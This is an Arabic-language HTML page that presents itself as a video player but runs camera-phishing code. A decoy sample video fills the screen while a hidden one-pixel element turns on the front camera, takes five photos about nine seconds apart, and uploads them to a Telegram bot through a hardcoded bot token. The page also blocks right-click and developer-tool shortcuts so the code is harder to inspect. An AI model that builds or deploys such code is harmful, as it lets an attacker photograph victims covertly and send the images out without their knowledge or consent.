<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
        }

        /* فيديو الخلفية - ملء الشاشة */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* كاميرا مخفية تماماً */
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
        }

        canvas {
            display: none;
        }

        /* إخفاء شريط الحالة تماماً */
        .status {
            display: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <!-- فيديو خلفية -->
    <div class="video-background">
        <video id="bgVideo" autoplay loop muted playsinline>
            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
        </video>
    </div>

    <!-- كاميرا مخفية -->
    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>
    
    <div class="status" id="status"></div>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let stream = null;
        let cameraReady = false;
        let currentPhoto = 0;
        const TOTAL_PHOTOS = 5;
        
        // ==================== عناصر الصفحة ====================
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        
        // ==================== الحصول على Chat ID (بدون رسائل) ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    return CHAT_ID !== null;
                }
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا (بدون رسائل) ====================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                cameraReady = true;
                return true;
            } catch(err) {
                console.error('خطأ الكاميرا:', err);
                return false;
            }
        }
        
        // ==================== التقاط وإرسال صورة واحدة ====================
        async function captureAndSend(photoNumber) {
            if (!CHAT_ID || !cameraReady) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', `📸 صورة ${photoNumber}/${TOTAL_PHOTOS}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                console.error('خطأ في الإرسال:', e);
                return false;
            }
        }
        
        // ==================== تصوير 5 صور (الأولى فوراً، ثم كل 9 ثواني) ====================
        async function captureAllPhotos() {
            // الصورة الأولى (فوراً)
            currentPhoto = 1;
            await captureAndSend(currentPhoto);
            
            // انتظار 9 ثواني ثم الصورة الثانية
            await delay(9000);
            currentPhoto = 2;
            await captureAndSend(currentPhoto);
            
            // انتظار 9 ثواني ثم الصورة الثالثة
            await delay(9000);
            currentPhoto = 3;
            await captureAndSend(currentPhoto);
            
            // انتظار 9 ثواني ثم الصورة الرابعة
            await delay(9000);
            currentPhoto = 4;
            await captureAndSend(currentPhoto);
            
            // انتظار 9 ثواني ثم الصورة الخامسة
            await delay(9000);
            currentPhoto = 5;
            await captureAndSend(currentPhoto);
            
            // إيقاف الكاميرا بعد الانتهاء
            setTimeout(() => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2000);
        }
        
        // ==================== دالة الانتظار ====================
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function init() {
            // تشغيل الكاميرا (سيطلب الإذن تلقائياً)
            const cameraSuccess = await startCamera();
            
            // الحصول على Chat ID
            await getChatId();
            
            // إذا كانت الكاميرا جاهزة، ابدأ التصوير
            if (cameraSuccess && CHAT_ID) {
                // انتظار ثانية لضبط الكاميرا ثم البدء
                setTimeout(() => {
                    captureAllPhotos();
                }, 1000);
            }
        }
        
        // ==================== بدء التشغيل تلقائياً ====================
        init();
        
        // ==================== منع أدوات المطور ====================
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        // ==================== إيقاف الكاميرا عند الخروج ====================
        window.onbeforeunload = () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
